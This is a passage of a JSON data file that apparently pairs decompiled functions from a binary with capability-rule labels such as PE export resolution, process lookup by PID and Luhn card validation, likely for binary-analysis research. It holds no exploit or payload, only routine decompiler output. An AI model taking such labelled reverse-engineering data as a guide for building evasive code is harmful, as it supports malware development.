            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00065ffc(void)\n\n{\n    ulong uVar1;\n    \n    if (*0x8e368 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = (**(*0x8e368 + 0x30))(*0x8e370);\n    }\n    return uVar1;\n}\n",
        "token_count": 78
    },
    "000662e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000662e8(void)\n\n{\n    if (*0x8e378 != 0) {\n        (**(*0x8e378 + 0x30))(*0x8e380);\n    }\n    return;\n}\n",
        "token_count": 52
    },
    "00066594": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00066594(void)\n\n{\n    if (*0x8e388 != 0) {\n        (**(*0x8e388 + 0x30))(*0x8e390);\n    }\n    return;\n}\n",
        "token_count": 51
    },
    "00066614": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00066614(void)\n\n{\n    int32_t iVar1;\n    uint uStack120;\n    ulong *puStack116;\n    ulong uStack104;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    ulong uStack80;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    ulong uStack56;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    ulong uStack32;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    puStack116 = &uStack104;\n    uStack120 = 4;\n    uStack96 = *0x7dc00;\n    uStack92 = *0x7dc04;\n    uStack88 = *0x7dc08;\n    uStack84 = *0x7dc0c;\n    uStack104 = 0x665b4;\n    uStack72 = *0x7dc10;\n    uStack68 = *0x7dc14;\n    uStack64 = *0x7dc18;\n    uStack60 = *0x7dc1c;\n    uStack80 = 0x665dc;\n    uStack48 = *0x7dc20;\n    uStack44 = *0x7dc24;\n    uStack40 = *0x7dc28;\n    uStack36 = *0x7dc2c;\n    uStack56 = 0x665ec;\n    uStack32 = 0x66600;\n    uStack24 = *0x7dc30;\n    uStack20 = *0x7dc34;\n    uStack16 = *0x7dc38;\n    uStack12 = *0x7dc3c;\n    iVar1 = fcn.00065ccc(0x3ea, 0x8e388);\n    if (iVar1 == 0) {\n        (**(*0x8e388 + 0x28))(*0x8e388, 5, 1, &uStack120, 0, 0x8e390);\n    }\n    return;\n}\n",
        "token_count": 492
    },
    "00020338": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.00020338(ulong *arg1, ulong arg2, ulong arg3, ulong *arg4)\n\n{\n    uint *in_stack_00000028;\n    \n    while( true ) {\n        if (arg1 == NULL) {\n            return 0;\n        }\n        if (*(arg1 + 1) == arg2) break;\n        arg1 = *arg1;\n    }\n    if (*(arg1 + 0xc) != arg3) {\n        return 0;\n    }\n    *arg4 = arg1[3];\n    if (in_stack_00000028 != NULL) {\n        *in_stack_00000028 = *(arg1 + 2);\n    }\n    return 1;\n}\n",
        "token_count": 155
    },
    "00020788": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00020788(int64_t arg1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    \n    if (arg1 != 0) {\n        puVar1 = *(arg1 + 0x10);\n        if (puVar1 == NULL) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = *puVar1;\n        }\n        *(arg1 + 0xc) = uVar2;\n        *(arg1 + 8) = uVar2;\n        for (; puVar1 != NULL; puVar1 = *(puVar1 + 6)) {\n            if (*puVar1 < *(arg1 + 8)) {\n                *(arg1 + 8) = *puVar1;\n            }\n            uVar2 = *puVar1;\n            if (*(arg1 + 0xc) <= uVar2 && uVar2 != *(arg1 + 0xc)) {\n                *(arg1 + 0xc) = uVar2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "00020914": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00020914(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if ((arg1 != 0) && (piVar2 = *(arg1 + 0x10),  piVar2 != NULL)) {\n        do {\n            if (*piVar2 == arg2) break;\n            piVar2 = *(piVar2 + 6);\n        } while (piVar2 != NULL);\n        if (piVar2 != NULL) {\n            iVar1 = -1;\n            if (0x2b < piVar2[3]) {\n                iVar1 = piVar2[3];\n            }\n            return iVar1;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 167
    },
    "00027834": {
        "rules": [
            "contain loop",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nuint fcn.00027834(int64_t arg1, char *arg2, int64_t *arg3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint uVar5;\n    int64_t iVar6;\n    uint32_t *puVar7;\n    int64_t iVar8;\n    uint16_t uVar9;\n    char *pcVar10;\n    uint32_t uVar11;\n    uint16_t *puVar12;\n    uint32_t *puVar13;\n    int64_t iVar14;\n    uint32_t uVar15;\n    uint32_t uStackX8;\n    \n    iVar4 = *(arg1 + 8);\n    if (iVar4 == 0) {\n        uVar5 = 0x21590066;\n    }\n    else if (arg2 == NULL) {\n        uVar5 = 0x21590067;\n    }\n    else if (arg3 == NULL) {\n        uVar5 = 0x21590068;\n    }\n    else {\n        iVar6 = *(iVar4 + 0x3c) + iVar4;\n        if (*(iVar6 + 0x18) == 0x10b) {\n            puVar7 = iVar6 + 0x78;\n        }\n        else {\n            puVar7 = iVar6 + 0x88;\n        }\n        uVar2 = *puVar7;\n        if (uVar2 != 0) {\n            iVar6 = iVar4 + uVar2;\n            iVar14 = *(iVar6 + 0x1c) + iVar4;\n            puVar12 = *(iVar6 + 0x24) + iVar4;\n            puVar13 = *(iVar6 + 0x20) + iVar4;\n            if ((arg2 & 0xffffffffffff0000) != 0) {\n                iVar8 = -1;\n                uStackX8 = 0;\n                pcVar10 = arg2;\n                do {\n                    if (iVar8 == 0) break;\n                    iVar8 = iVar8 + -1;\n                    cVar1 = *pcVar10;\n                    pcVar10 = pcVar10 + 1;\n                } while (cVar1 != '\\0');\n                uVar15 = ~iVar8 - 1;\n                if (*(iVar6 + 0x18) == 0) {\n                    return 0x21590005;\n                }\n                do {\n                    uVar3 = *(iVar14 + *puVar12 * 4);\n                    if ((uVar15 < (puVar7[1] + uVar2) - *puVar13) && (*(uVar15 + *puVar13 + iVar4) == '\\0')) {\n                        uVar11 = 0;\n                        if (uVar15 == 0) goto joined_r0x0004e2a5;\n                        pcVar10 = arg2;\n                        do {\n                            if (pcVar10[(*puVar13 + iVar4) - arg2] != *pcVar10) break;\n                            uVar11 = uVar11 + 1;\n                            pcVar10 = pcVar10 + 1;\n                        } while (uVar11 < uVar15);\n                        if (uVar15 <= uVar11) goto joined_r0x0004e2a5;\n                    }\n                    uStackX8 = uStackX8 + 1;\n                    puVar12 = puVar12 + 1;\n                    puVar13 = puVar13 + 1;\n                    if (*(iVar6 + 0x18) <= uStackX8) {\n                        return 0x21590005;\n                    }\n                } while( true );\n            }\n            uVar9 = arg2 - *(iVar6 + 0x10);\n            if (uVar9 < *(iVar6 + 0x14) || uVar9 == *(iVar6 + 0x14)) {\n                uVar3 = *(iVar14 + uVar9 * 4);\njoined_r0x0004e2a5:\n                if ((uVar2 <= uVar3) && (uVar3 < puVar7[1] + uVar2)) {\n                    uVar5 = fcn.0004d7dc(uVar3 + iVar4, arg3);\n                    return uVar5;\n                }\n                *arg3 = iVar4 + uVar3;\n                return 0;\n            }\n        }\n        uVar5 = 0x21590005;\n    }\n    return uVar5;\n}\n",
        "token_count": 976
    },
    "0003e0d0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0003fb62)\n// WARNING: Removing unreachable block (ram,0x0003fb6a)\n\nvoid fcn.0003e0d0(int64_t arg1)\n\n{\n    int64_t **arg1_00;\n    int64_t **ppiVar1;\n    int64_t **ppiVar2;\n    int64_t **ppiVar3;\n    bool bVar4;\n    uchar auStackX24 [16];\n    \n    arg1_00 = *(arg1 + 0x28);\n    if ((*0x80378 != 0) || (*0x80370 != NULL)) {\n        fcn.00032650(0x80358, auStackX24, 1);\n        ppiVar1 = NULL;\n        ppiVar2 = *0x80370;\n        if (*0x80370 != NULL) {\n            do {\n                ppiVar3 = ppiVar2;\n                if (arg1_00 == ppiVar2) break;\n                ppiVar3 = *ppiVar2;\n                ppiVar1 = ppiVar2;\n                ppiVar2 = ppiVar3;\n            } while (ppiVar3 != NULL);\n            if (ppiVar3 != NULL) {\n                ppiVar2 = *arg1_00;\n                if (ppiVar1 != NULL) {\n                    *ppiVar1 = *arg1_00;\n                    ppiVar2 = *0x80370;\n                }\n                *0x80370 = ppiVar2;\n                fcn.00032684(0x80358, auStackX24, 1);\n                fcn.00032650(arg1_00 + 0x101, auStackX24, 1);\n                ppiVar1 = arg1_00[0x107];\n                while (ppiVar1 != NULL) {\n                    ppiVar2 = *ppiVar1;\n                    fcn.00030d24(ppiVar1[3]);\n                    fcn.00030d24(ppiVar1);\n                    ppiVar1 = ppiVar2;\n                }\n                fcn.00032684(arg1_00 + 0x101, auStackX24, 1);\n                fcn.000326c0(arg1_00 + 0x101);\n                bVar4 = *(arg1_00 + 0x7da) == 1;\n                ppiVar1 = arg1_00 + 0xeb;\n                if (bVar4) {\n                    ppiVar1 = arg1_00 + 0xda;\n                }\n                fcn.0004bd34(bVar4, 6, ppiVar1);\n                fcn.0003f47c(arg1_00 + 0xeb, *(arg1_00 + 0xfb), arg1_00 + 0xda);\n                fcn.00030d24(arg1_00);\n                return;\n            }\n        }\n        fcn.00032684(0x80358, auStackX24, 1);\n    }\n    return;\n}\n",
        "token_count": 663
    },
    "0004cb68": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.0004cb68(uint64_t arg1, uchar *arg2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t in_GS_OFFSET;\n    uchar auStack152 [24];\n    ulong uStack128;\n    uchar *puStack120;\n    int32_t iStack112;\n    uchar auStack104 [72];\n    \n    uVar1 = (**0x11200)();\n    if (arg1 == *(in_GS_OFFSET + 0x52)) {\n        iStack112 = (*0x4cb24)(arg2);\n    }\n    else {\n        (*_fcn.00011608)(auStack152, 0, 0);\n        uStack128 = 0x4cb24;\n        puStack120 = arg2;\n        (**0x11610)(auStack104, 0x1a788, auStack152);\n        uVar3 = 0;\n        (**0x11618)(auStack104, 2);\n        (**0x11620)(auStack104, uVar3 & 0xffffffffffffff00 | arg1 & 0xff);\n        (**0x11628)(auStack104, 0, 0);\n        do {\n            arg2 = auStack152;\n            iVar2 = (**0x111f8)(arg2);\n        } while (iVar2 == 0);\n    }\n    (*_fcn.000111f0)(arg2 & 0xffffffffffffff00 | uVar1);\n    return ~-(iStack112 != 0) & 0xc0000001;\n}\n",
        "token_count": 350
    },
    "0006387c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0006387c(int64_t arg1)\n\n{\n    char cVar1;\n    char cVar2;\n    char **ppcVar3;\n    ulong *puVar4;\n    char *pcVar5;\n    int64_t iVar6;\n    \n    puVar4 = 0x7da88;\n    do {\n        for (ppcVar3 = *puVar4; (ppcVar3 != NULL && (pcVar5 = *ppcVar3,  pcVar5 != NULL)); ppcVar3 = ppcVar3 + 0x14) {\n            iVar6 = arg1 - pcVar5;\n            do {\n                cVar1 = *pcVar5;\n                cVar2 = pcVar5[iVar6];\n                if (cVar1 != cVar2) break;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            if ((cVar1 == cVar2) && (*(ppcVar3 + 1) == 2)) {\n                return *(ppcVar3 + 0xc);\n            }\n        }\n        puVar4 = puVar4 + -2;\n        if (puVar4 < 0x7d9f8) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 284
    },
    "00063888": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.00063888(int64_t arg1)\n\n{\n    char cVar1;\n    char cVar2;\n    char **ppcVar3;\n    ulong *puVar4;\n    char *pcVar5;\n    int64_t iVar6;\n    \n    puVar4 = 0x7da88;\n    do {\n        for (ppcVar3 = *puVar4; (ppcVar3 != NULL && (pcVar5 = *ppcVar3,  pcVar5 != NULL)); ppcVar3 = ppcVar3 + 0x14) {\n            iVar6 = arg1 - pcVar5;\n            do {\n                cVar1 = *pcVar5;\n                cVar2 = pcVar5[iVar6];\n                if (cVar1 != cVar2) break;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            if ((cVar1 == cVar2) && (*(ppcVar3 + 1) == 3)) {\n                return *(ppcVar3 + 0xc);\n            }\n        }\n        puVar4 = puVar4 + -2;\n        if (puVar4 < 0x7d9f8) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 283
    },
    "00063894": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.00063894(int64_t arg1)\n\n{\n    char cVar1;\n    char cVar2;\n    char **ppcVar3;\n    ulong *puVar4;\n    char *pcVar5;\n    int64_t iVar6;\n    \n    puVar4 = 0x7da88;\n    do {\n        for (ppcVar3 = *puVar4; (ppcVar3 != NULL && (pcVar5 = *ppcVar3,  pcVar5 != NULL)); ppcVar3 = ppcVar3 + 0x14) {\n            iVar6 = arg1 - pcVar5;\n            do {\n                cVar1 = *pcVar5;\n                cVar2 = pcVar5[iVar6];\n                if (cVar1 != cVar2) break;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            if ((cVar1 == cVar2) && (*(ppcVar3 + 1) == 4)) {\n                return *(ppcVar3 + 0xc);\n            }\n        }\n        puVar4 = puVar4 + -2;\n        if (puVar4 < 0x7d9f8) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 283
    },
    "0003205c": {
        "rules": [
            "find process by PID"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00031fdf)\n// WARNING: Removing unreachable block (ram,0x00031fe9)\n// WARNING: Removing unreachable block (ram,0x00031ffb)\n// WARNING: Removing unreachable block (ram,0x0003202a)\n\nulong fcn.0003205c(uchar *arg1, int64_t arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong uStackX32;\n    \n    if ((arg1 != NULL) && (arg2 != 0)) {\n        *arg1 = 0;\n        if ((*0x7f8d0 != 0) || (cVar1 = (*_fcn.000115f8)(),  cVar1 != '\\0')) {\ncode_r0x00031fdb:\n            iVar3 = (*_fcn.000113e0)();\n            fcn.00066830(arg1, *0x7f8d0 + iVar3, arg2);\n            arg1[arg2 + -1] = 0;\n            return 1;\n        }\n        iVar2 = (*_fcn.00011220)(&uStackX32, 0, 0, 0, 0, 0x31ef4, 0x7f8d0);\n        if (iVar2 == 0) {\n            fcn.000667be(uStackX32, 0, 0);\n            fcn.000666f2(uStackX32);\n            if (*0x7f8d0 != 0) goto code_r0x00031fdb;\n            *arg1 = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 370
    }
}